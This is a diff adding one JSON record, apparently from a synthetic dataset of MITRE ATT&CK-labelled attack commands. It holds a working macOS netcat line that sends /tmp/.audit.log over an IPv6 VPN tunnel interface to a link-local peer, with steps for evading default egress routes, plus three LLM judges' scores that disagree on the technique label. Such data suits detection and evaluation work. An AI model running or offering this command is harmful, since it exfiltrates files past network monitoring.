@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "nc -6 -u -s \"$(ipconfig getv6ifaddr utun2)\" \"fe80::5:cafe:2%utun2\" 55444 < /tmp/.audit.log",
+  "explanation": "Exfiltrates over a utun (virtual tunnel/VPN) interface using IPv6 UDP and a rare port, satisfying T1011 by using a non-primary network tunnel medium.",
+  "rationale_steps": [
+    "Use ipconfig to read the IPv6 address on utun2 to target the tunnel medium.",
+    "Bind the UDP sender to the utun2 address to avoid default egress routes.",
+    "Send the payload to a link-local peer inside the tunnel on an uncommon port."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-7a6bf8eb-6452a689",
+  "source_prompt_hash": "7a6bf8eb",
+  "timestamp_utc": "2025-09-30T08:23:23.913402Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper quoting, valid nc flags, and correct use of command substitution for the source IP address.",
+        "semantic_score": 4,
+        "semantic_justification": "The command correctly implements exfiltration over a network (T1011) using IPv6 UDP over a tunnel interface, though T1011 typically refers to 'Exfiltration Over Other Network Medium' rather than account establishment as described in the prompt.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T10:56:07.101069Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with valid flags, balanced quotes, correct command substitution, and proper input redirection for a Bash shell on macOS.",
+        "semantic_score": 0,
+        "semantic_justification": "The command performs data exfiltration, which is a valid adversarial action (e.g., T1041 or T1567), but it has no semantic alignment whatsoever with MITRE ATT&CK T1011 (Establish Accounts), which is about account creation or abuse.",
+        "combined_score": 2.5,
+        "confidence": 1,
+        "timestamp": "2025-10-02T10:56:14.272041Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed nc invocation with valid flags (-6 -u -s), balanced quoting, proper IPv6 scope-ID syntax, and correct input redirection.",
+        "semantic_score": 4,
+        "semantic_justification": "Likely achieves exfiltration of /tmp/.audit.log via IPv6 UDP over utun2 to a link-local peer, but depends on utun2 having a valid IPv6 address/reachable target and does not align with the provided technique description (account creation).",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-02T10:57:23.867722Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 2.667,
+    "llm_average_score": 3.833,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
